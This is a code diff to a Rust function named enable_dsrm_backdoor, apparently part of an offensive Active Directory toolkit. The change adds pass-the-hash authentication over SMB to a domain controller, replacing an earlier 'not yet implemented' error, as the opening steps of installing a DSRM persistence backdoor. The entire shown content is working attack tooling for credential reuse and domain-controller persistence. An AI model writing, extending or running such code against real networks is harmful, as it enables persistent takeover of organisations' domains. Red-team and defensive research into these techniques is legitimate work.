@@ -41,13 +41,9 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[dsrm] Enabling DSRM backdoor on {}", config.dc_ip);
 
     // ── Validate credentials ────────────────────────────────────
-    let password = match (&config.password, &config.nt_hash) {
-        (Some(pw), _) => pw.clone(),
-        (None, Some(_hash)) => {
-            return Err(OverthroneError::TicketForge(
-                "Pass-the-hash SMB auth not yet implemented; supply a plaintext password".into(),
-            ));
-        }
+    let (use_password, password_or_hash) = match (&config.password, &config.nt_hash) {
+        (Some(pw), _) => (true, pw.clone()),
+        (None, Some(hash)) => (false, hash.clone()),
         _ => {
             return Err(OverthroneError::TicketForge(
                 "Credentials required for DSRM backdoor".into(),
@@ -57,14 +53,26 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
 
     // ── Step 1: Connect to DC via SMB ───────────────────────────
     info!("[dsrm] Connecting to {} via SMB", config.dc_ip);
-    let smb = SmbSession::connect(&config.dc_ip, &config.domain, &config.username, &password)
-        .await
-        .map_err(|e| {
-            OverthroneError::TicketForge(format!(
-                "SMB connect to {} failed: {e}",
-                config.dc_ip
-            ))
-        })?;
+    let smb = if use_password {
+        SmbSession::connect(&config.dc_ip, &config.domain, &config.username, &password_or_hash)
+            .await
+            .map_err(|e| {
+                OverthroneError::TicketForge(format!(
+                    "SMB connect to {} failed: {e}",
+                    config.dc_ip
+                ))
+            })?
+    } else {
+        info!("[dsrm] Using pass-the-hash authentication");
+        SmbSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, &password_or_hash)
+            .await
+            .map_err(|e| {
+                OverthroneError::TicketForge(format!(
+                    "SMB PTH connect to {} failed: {e}",
+                    config.dc_ip
+                ))
+            })?
+    };
 
     // ── Step 2: Verify admin access ─────────────────────────────
     info!("[dsrm] Verifying admin access on {}", config.dc_ip);
